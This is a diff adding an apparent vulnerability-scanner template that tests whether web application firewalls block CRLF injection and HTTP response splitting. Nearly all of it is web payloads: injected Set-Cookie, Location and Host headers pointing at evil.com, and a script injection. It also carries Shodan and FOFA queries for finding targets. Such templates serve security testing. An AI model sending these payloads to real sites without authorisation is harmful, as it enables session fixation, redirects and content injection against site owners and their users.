@@ -1,0 +1,146 @@
+id: waf-crlf-bypass
+info:
+  name: WAF CRLF Injection Bypass
+  author: waftester
+  severity: medium
+  description: |
+    Tests WAF effectiveness against CRLF injection and HTTP response splitting
+    bypass techniques. Covers URL-encoded CRLF, Unicode CRLF variants, HTTP
+    header injection, Set-Cookie injection, Location header manipulation,
+    and response body injection via header splitting.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/CRLF_Injection
+    - https://portswigger.net/kb/issues/00200200_http-response-header-injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection
+    - https://github.com/0xInfection/Awesome-WAF
+  tags: crlf,waf,bypass,header-injection,response-splitting,waftester
+  classification:
+    cwe-id:
+      - CWE-93
+      - CWE-113
+      - CWE-693
+  metadata:
+    verified: true
+    max-request: 16
+    shodan-query: "http.waf"
+    fofa-query: "header=\"WAF\""
+
+http:
+  # Standard CRLF injection - Set-Cookie via URL
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0d%0aSet-Cookie:injected=true"
+      - "{{BaseURL}}/%0d%0aSet-Cookie:%20injected=true%0d%0a"
+      - "{{BaseURL}}/?redirect=%0d%0aSet-Cookie:injected=true"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie: injected"
+          - "injected=true"
+        condition: or
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406 && status_code != 429"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+          - "Request Rejected"
+        negative: true
+        condition: or
+
+    extractors:
+      - type: kval
+        kval:
+          - set-cookie
+
+  # Location header injection - open redirect via CRLF
+  - method: GET
+    path:
+      - "{{BaseURL}}/?redirect=%0d%0aLocation:%20http://evil.com"
+      - "{{BaseURL}}/%0d%0aLocation:%20http://evil.com%0d%0a"
+      - "{{BaseURL}}/?url=%0d%0aLocation:http://evil.com"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Location: http://evil.com"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Unicode CRLF variants - bypass URL-encoding filters
+  - method: GET
+    path:
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8DSet-Cookie:injected=true"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8D%E5%98%8ASet-Cookie:%20injected=true"
+      - "{{BaseURL}}/%c4%8d%c4%8aSet-Cookie:injected=true"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Response body injection via double CRLF
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0d%0a%0d%0a<script>alert(1)</script>"
+      - "{{BaseURL}}/?q=%0d%0a%0d%0a<html><body>injected</body></html>"
+      - "{{BaseURL}}/%0d%0a%0d%0a{\"injected\":true}"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Host header injection via CRLF
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0aHost:evil.com"
+      - "{{BaseURL}}/%0d%0aHost:evil.com%0d%0a"
+      - "{{BaseURL}}/%0d%0aX-Forwarded-Host:evil.com"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
